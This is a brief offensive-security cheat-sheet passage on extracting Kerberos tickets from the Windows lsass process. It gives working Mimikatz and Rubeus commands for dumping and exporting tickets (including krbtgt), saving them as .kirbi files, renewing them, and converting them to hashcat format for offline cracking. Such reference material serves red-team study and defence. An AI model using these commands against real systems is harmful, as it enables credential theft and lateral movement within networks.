Tickets in Windows are managed and stored by the **lsass** (Local Security Authority Subsystem Service) process, responsible for handling security policies. To extract these tickets, it's necessary to interface with the lsass process. A non-administrative user can only access their own tickets, while an administrator has the privilege to extract all tickets on the system. For such operations, the tools **Mimikatz** and **Rubeus** are widely employed, each offering different commands and functionalities.

### Mimikatz
Mimikatz is a versatile tool that can interact with Windows security. It's used not only for extracting tickets but also for various other security-related operations.

```bash
# Extracting tickets using Mimikatz
sekurlsa::tickets /export
```

### Rubeus
Rubeus is a tool specifically tailored for Kerberos interaction and manipulation. It's used for ticket extraction and handling, as well as other Kerberos-related activities.

```bash
# Dumping all tickets using Rubeus
.\Rubeus dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Listing all tickets
.\Rubeus.exe triage

# Dumping a specific ticket by LUID
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Renewing a ticket
.\Rubeus.exe renew /ticket:<BASE64_TICKET>

# Converting a ticket to hashcat format for offline cracking
.\Rubeus.exe hash /ticket:<BASE64_TICKET>
```

When using these commands, ensure to replace placeholders like `<BASE64_TICKET>` and `<luid>` with the actual Base64 encoded ticket and Logon ID respectively. These tools provide extensive functionality for managing tickets and interacting with the security mechanisms of Windows.
